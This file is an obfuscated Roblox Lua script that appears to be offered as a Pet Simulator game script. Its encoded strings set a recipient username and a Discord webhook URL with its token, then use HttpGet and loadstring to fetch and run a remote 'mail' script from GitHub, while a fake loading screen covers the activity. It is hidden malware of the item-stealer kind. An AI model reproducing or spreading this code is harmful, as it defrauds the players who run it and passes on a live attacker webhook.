--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v73=0;local v74;while true do if (v73==0) then v74=v2(v0(v30,16));if v19 then local v98=0;local v99;while true do if (v98==1) then return v99;end if (v98==0) then v99=v5(v74,v19);v19=nil;v98=1;end end else return v74;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v75=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + (932 -(857 + 74)))) ;return v75-(v75%(569 -(367 + (1078 -(282 + 595))))) ;else local v76=(929 -((1851 -(1523 + 114)) + 713))^(v32-1) ;return (((v31%(v76 + v76))>=v76) and (1 + 0)) or (0 + 0) ;end end local function v21()local v34=0 + 0 ;local v35;while true do if (v34==(1 -(117 -(32 + 85)))) then return v35;end if (v34==(1065 -(67 + 1 + 997))) then v35=v1(v16,v18,v18);v18=v18 + (1271 -(226 + 1044)) ;v34=4 -3 ;end end end local function v22()local v36,v37=v1(v16,v18,v18 + 1 + 1 );v18=v18 + (959 -(892 + 65)) ;return (v37 * 256) + v36 ;end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + (7 -(184 -(67 + 113))) );v18=v18 + 4 ;return (v41 * ((22739972 + 8271640) -14234396)) + (v40 * (120312 -54776)) + (v39 * (606 -(87 + 263))) + v38 ;end local function v24()local v42=0 -0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(1 + (0 -0))) then v45=1 + 0 ;v46=(v20(v44,3 -2 ,35 -15 ) * ((954 -(802 + 150))^(470 -(145 + (1387 -1094))))) + v43 ;v42=5 -3 ;end if (v42==(3 -1)) then v47=v20(v44,16 + 5 ,1028 -(915 + 82) );v48=((v20(v44,90 -58 )==(1 + 0)) and  -(1 + 0)) or (1139 -(116 + 1022)) ;v42=(2 + 1) -0 ;end if (v42==(0 + 0)) then v43=v23();v44=v23();v42=(4090 -2902) -(1069 + 118) ;end if (v42==(6 -3)) then if (v47==(0 -0)) then if (v46==(0 + 0)) then return v48 * (0 -0) ;else v47=1 + (1747 -(760 + 987)) ;v45=791 -((2281 -(1789 + 124)) + 423) ;end elseif (v47==(6433 -4386)) then return ((v46==(18 -(10 + 8))) and (v48 * ((3 -2)/(442 -(416 + 26))))) or (v48 * NaN) ;end return v8(v48,v47-((3212 -(745 + 21)) -(630 + 793)) ) * (v45 + (v46/((1 + 1)^52))) ;end end end local function v25(v49)local v50;if  not v49 then local v77=0 -0 ;while true do if (v77==(0 -0)) then v49=v23();if (v49==(1055 -(87 + 968))) then return "";end break;end end end v50=v3(v16,v18,(v18 + v49) -1 );v18=v18 + v49 ;local v51={};for v66=(4 + 0) -3 , #v50 do v51[v66]=v2(v1(v3(v50,v66,v66)));end return v6(v51);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=0;local v53;local v54;local v55;local v56;local v57;local v58;local v59;while true do if (v52==2) then v57=nil;v58=nil;v52=1693 -(209 + 1481) ;end if (v52==0) then v53=0;v54=nil;v52=2 -1 ;end if (3==v52) then v59=nil;while true do local v91=0;while true do if (v91~=(1637 -(1373 + 263))) then else if (v53==0) then local v100=0;while true do if (v100~=(1001 -(451 + 549))) then else v56={};v57={v54,v55,nil,v56};v100=2 -0 ;end if (v100~=0) then else v54={};v55={};v100=1 -0 ;end if (v100~=(1386 -(746 + 638))) then else v53=1;break;end end end break;end if ((0 + 0)~=v91) then else if (v53==1) then local v101=0;while true do if (v101~=(2 -0)) then else v53=343 -(218 + 123) ;break;end if (v101==(1581 -(1535 + 46))) then v58=v23();v59={};v101=1 + 0 ;end if (v101~=1) then else for v118=1 + 0 ,v58 do local v119=560 -(306 + 254) ;local v120;local v121;local v122;local v123;while true do if (v119==(0 + 0)) then v120=0 -0 ;v121=nil;v119=1;end if (v119==(1468 -(899 + 568))) then v122=nil;v123=nil;v119=2 + 0 ;end if (v119==(4 -2)) then while true do if (v120==(603 -(268 + 335))) then local v152=290 -(60 + 230) ;local v153;while true do if (v152==0) then v153=572 -(426 + 146) ;while true do if (v153~=(0 + 0)) then else local v169=1456 -(282 + 1174) ;while true do if (v169==(811 -(569 + 242))) then v121=0;v122=nil;v169=1;end if (v169==(2 -1)) then v153=1;break;end end end if (v153~=1) then else v120=1;break;end end break;end end end if (v120~=1) then else v123=nil;while true do if ((1 + 0)~=v121) then else if (v122==1) then v123=v21()~=(1024 -(706 + 318)) ;elseif (v122==2) then v123=v24();elseif (v122==(1254 -(721 + 530))) then v123=v25();end v59[v118]=v123;break;end if (v121==(1271 -(945 + 326))) then local v161=0 -0 ;local v162;while true do if (v161==(0 + 0)) then v162=0;while true do if (v162~=(701 -(271 + 429))) then else v121=1;break;end if (v162==0) then local v178=0;while true do if ((1 + 0)==v178) then v162=1501 -(1408 + 92) ;break;end if (v178==(1086 -(461 + 625))) then v122=v21();v123=nil;v178=1;end end end end break;end end end end break;end end break;end end end v57[1291 -(993 + 295) ]=v21();v101=2;end end end if (v53==(1 + 1)) then local v102=0;while true do if ((1172 -(418 + 753))==v102) then for v124=1 + 0 ,v23() do v56[v124]=v23();end return v57;end if (v102==0) then for v126=1,v23() do local v127=0 + 0 ;local v128;while true do if (v127==0) then v128=v21();if (v20(v128,1 + 0 ,1)~=(0 + 0)) then else local v145=0;local v146;local v147;local v148;while true do if (v145==1) then v148={v22(),v22(),nil,nil};if (v146==(0 + 0)) then local v163=0;local v164;local v165;local v166;while true do if (v163==0) then v164=1322 -(1249 + 73) ;v165=nil;v163=1 + 0 ;end if (v163~=1) then else v166=nil;while true do if (v164==(1145 -(466 + 679))) then local v179=0;while true do if ((0 -0)~=v179) then else v165=0;v166=nil;v179=2 -1 ;end if (v179~=(1901 -(106 + 1794))) then else v164=1 + 0 ;break;end end end if (1==v164) then while true do if (v165==0) then v166=0;while true do if (v166==0) then v148[1 + 2 ]=v22();v148[4]=v22();break;end end break;end end break;end end break;end end elseif (v146==(2 -1)) then v148[3]=v23();elseif (v146==2) then v148[7 -4 ]=v23() -((116 -(4 + 110))^16) ;elseif (v146==3) then local v180=0;while true do if (v180~=(584 -(57 + 527))) then else v148[3]=v23() -((1429 -(41 + 1386))^(119 -(17 + 86))) ;v148[3 + 1 ]=v22();break;end end end v145=3 -1 ;end if (v145~=(0 -0)) then else local v157=0;while true do if (v157==(167 -(122 + 44))) then v145=1 -0 ;break;end if (v157~=(0 -0)) then else v146=v20(v128,2,3);v147=v20(v128,4,6);v157=1;end end end if (v145==(3 + 0)) then if (v20(v147,3,1 + 2 )~=(1 -0)) then else v148[69 -(30 + 35) ]=v59[v148[4]];end v54[v126]=v148;break;end if ((2 + 0)==v145) then local v159=0;while true do if ((1258 -(1043 + 214))==v159) then v145=11 -8 ;break;end if (v159==(1212 -(323 + 889))) then if (v20(v147,2 -1 ,581 -(361 + 219) )~=(321 -(53 + 267))) then else v148[1 + 1 ]=v59[v148[415 -(15 + 398) ]];end if (v20(v147,984 -(18 + 964) ,2)==(3 -2)) then v148[2 + 1 ]=v59[v148[2 + 1 ]];end v159=1;end end end end end break;end end end for v129=1,v23() do v55[v129-(851 -(20 + 830)) ]=v28();end v102=1 + 0 ;end end end v91=1;end end end break;end if (v52~=(127 -(116 + 10))) then else v55=nil;v56=nil;v52=2;end end end local function v29(v60,v61,v62)local v63=v60[1];local v64=v60[2];local v65=v60[3];return function(...)local v68=1;local v69= -1;local v70={...};local v71=v12("#",...) -1 ;local function v72()local v78=v63;local v79=v64;local v80=v65;local v81=v27;local v82={};local v83={};local v84={};for v88=0 + 0 ,v71 do if ((v88>=v80) or ((4142 -((1305 -763) + 97 + 99))>4503)) then v82[v88-v80 ]=v70[v88 + (1 -0) ];else v84[v88]=v70[v88 + 1 + 0 ];end end local v85=(v71-v80) + 1 + 0 ;local v86;local v87;while true do local v89=(0 -0) + 0 ;while true do if ((v89==(0 -0)) or (((9753 -(574 + 191)) -5482)<=1309)) then v86=v78[v68];v87=v86[1 + 0 ];v89=1552 -(1126 + 425) ;end if (((3360 -(118 + 287))==(11581 -8626)) and ((1122 -(118 + 1003))==v89)) then if ((v87<=(14 -9)) or (2903==1495)) then if (((4923 -(142 + 235))>=(10320 -8045)) and (v87<=(1 + 1 + 0))) then if (((1796 -((2243 -(1121 + 569)) + 424))>=(41 -(47 -28))) and (v87<=(0 + 0))) then local v104=0 + 0 ;local v105;local v106;while true do if (((1842 + 1320)==(1345 + 1817)) and (v104==((214 -(22 + 192)) + 0))) then v105=v86[4 -2 ];v106=v84[v86[7 -4 ]];v104=(685 -(483 + 200)) -1 ;end if ((v104==(1 + 0)) or ((11448 -9079)>(5182 -(239 + 514)))) then v84[v105 + 1 ]=v106;v84[v105]=v106[v86[2 + 2 ]];break;end end elseif (((5424 -(408 + 389 + 532))>=(2313 + 870)) and (v87==1)) then v84[v86[1 + (850 -(254 + 595)) ]]=v86[3];else v84[v86[4 -(128 -(55 + 71)) ]]=v62[v86[1205 -(373 + 829) ]];end elseif ((v87<=((2197 -(1404 + 59)) -(476 + 255))) or (3711<(2138 -(369 + 761)))) then v84[v86[(2 -0) + 0 ]][v86[5 -(1792 -(573 + 1217)) ]]=v86[(19 -12) -3 ];elseif ((v87==(242 -(64 + (233 -59)))) or ((150 + 899)<=((103 + 1238) -435))) then do return;end else v62[v86[339 -((909 -(468 + 297)) + 192) ]]=v84[v86[218 -((604 -(334 + 228)) + (1113 -(714 + 225))) ]];end elseif (((3391 + 1122)>(2259 + 467)) and (v87<=8)) then if ((v87<=(3 + 3)) or ((2985 -(363 + 1141))>=(4238 -((3456 -2273) + 397)))) then local v109=0;local v110;local v111;while true do if ((v109==(0 -0)) or (((3291 -930) + 93 + 766)==1364)) then v110=0 + 0 ;v111=nil;v109=3 -2 ;end if (((1976 -((2769 -856) + 62))==v109) or ((664 + (903 -513))>(8979 -5587))) then while true do if ((v110==(0 -0)) or ((2609 -(565 + 1368))>=(6175 -4533))) then v111=v86[2];v84[v111]=v84[v111](v13(v84,v111 + 1 ,v69));break;end end break;end end elseif (((5797 -(1477 + 184))>((4072 -(118 + 688)) -869)) and (v87>(7 + 0))) then v84[v86[2]]();else v68=v86[859 -(564 + 292) ];end elseif ((v87<=(3 + 6)) or (4334==(7324 -3079))) then local v112=236 -(141 + 95) ;local v113;local v114;local v115;local v116;local v117;while true do if ((v112==1) or (((12936 -(25 + 23)) -8612)<=((3276 + 59) -(244 + 60)))) then v115=nil;v116=nil;v112=2 + 0 ;end if ((v112==(478 -(41 + 435))) or ((5783 -(938 + 63))<=(923 + 276))) then v117=nil;while true do if ((v113==(1126 -(936 + 189))) or ((1601 + 3263)<(3515 -(304 + 1261 + 48)))) then v69=(v116 + v114) -(1 + 0) ;v117=1138 -(782 + 356) ;v113=2;end if (((5106 -((452 -276) + 91))>=(9639 -(7825 -(927 + 959)))) and (v113==((6 -4) -(0 -0)))) then for v154=v114,v69 do local v155=1092 -(229 + 746 + (320 -203)) ;local v156;while true do if ((v155==(1875 -(157 + 1718))) or ((873 + 202)>(6808 -4890))) then v156=0;while true do if (((279 + 117)<=((13736 -(16 + 716)) -9200)) and (v156==(1018 -(697 + 321)))) then v117=v117 + (2 -1) ;v84[v154]=v115[v117];break;end end break;end end end break;end if ((v113==(0 -0)) or ((9610 -5441)==(852 + 1335))) then v114=v86[3 -1 ];v115,v116=v81(v84[v114](v13(v84,v114 + (2 -1) ,v86[1230 -(322 + 905) ])));v113=(1180 -568) -(602 + 9) ;end end break;end if ((((2692 -(11 + 86)) -(449 + 740))==1406) and (v112==(872 -(826 + 46)))) then v113=947 -(245 + 702) ;v114=nil;v112=1;end end elseif (((4837 -3306)<(715 + 658 + 2898)) and (v87==((4653 -2745) -(260 + (2306 -668))))) then if ((635==((1360 -(175 + 110)) -(382 + 35 + 23))) and (v84[v86[165 -(92 + 71) ]]==v86[12 -8 ])) then v68=v68 + 1 + 0 ;else v68=v86[5 -2 ];end else v84[v86[5 -3 ]]=v86[3]~=(1205 -((2276 -1374) + 303)) ;end v68=v68 + (1 -0) ;break;end end end end A,B=v27(v11(v72));if  not A[1] then local v90=v60[4][v68] or "?" ;error("Script error at ["   .. v90   .. "]:"   .. A[2] );else return v13(A,2,B);end end;end return v29(v28(),{},v17)(...);end v15("LOL!1C3O00028O00026O00084003023O005F47030B3O0057616974696E6754696D65025O00806640030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403673O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F42616F6875796E68736972697573313233343534332F50657473696D756C61746F722F6D61696E2F6D61696C2D726576756D702D6F6266757363617465645F31342E6C7561026O00F03F030A3O005363726970744E616D65030C3O0052692O7A205363726970747A027O004003093O00416E74694C65617665010003093O004D6F7573654C6F636B2O0103083O00557365724E616D65030A3O006479727468797572747903073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O313033323732333935363937303431342O392F4B7A674E53735476692O785063664E384853373055394B5476715F474B517061422O5A7A32497433623451576533545A50396B6A4E476B765F682O696743596246655474030D3O004C6F6164696E675363722O656E03093O00546869726454657874030E3O00416C6D6F737420446F6E653O2E03093O0046697273745465787403103O0053637269707420507265706172696E67030A3O005365636F6E645465787403113O00536372697074204C6F6164696E673O2E00433O0012013O00013O00260A3O000E000100020004073O000E0001001202000100033O003003000100040005001202000100063O001202000200073O00202O000200020008001201000400094O000B000500014O0009000200054O000600013O00022O00080001000100010004073O0042000100260A3O001F0001000A0004073O001F0001001201000100013O00260A000100170001000A0004073O00170001001202000200033O0030030002000B000C0012013O000D3O0004073O001F000100260A00010011000100010004073O00110001001202000200033O0030030002000E000F001202000200033O0030030002001000110012010001000A3O0004073O0011000100260A3O0030000100010004073O00300001001201000100013O00260A00010029000100010004073O00290001001201000200133O001205000200123O001201000200153O001205000200143O0012010001000A3O00260A000100220001000A0004073O00220001001202000200033O0030030002001600110012013O000A3O0004073O003000010004073O0022000100260A3O00010001000D0004073O00010001001201000100013O00260A000100390001000A0004073O00390001001202000200033O0030030002001700180012013O00023O0004073O0001000100260A00010033000100010004073O00330001001202000200033O00300300020019001A001202000200033O0030030002001B001C0012010001000A3O0004073O003300010004073O000100012O00043O00017O00433O00023O00043O00043O00053O00053O00063O00063O00063O00063O00063O00063O00063O00063O00073O00093O00093O000A3O000C3O000C3O000D3O000D3O000E3O000F3O00113O00113O00123O00123O00133O00133O00143O00153O00183O00183O00193O001B3O001B3O001C3O001C3O001D3O001D3O001E3O00203O00203O00213O00213O00223O00233O00243O00273O00273O00283O002A3O002A3O002B3O002B3O002C3O002D3O002F3O002F3O00303O00303O00313O00313O00323O00333O00353O00373O00",v9(),...);end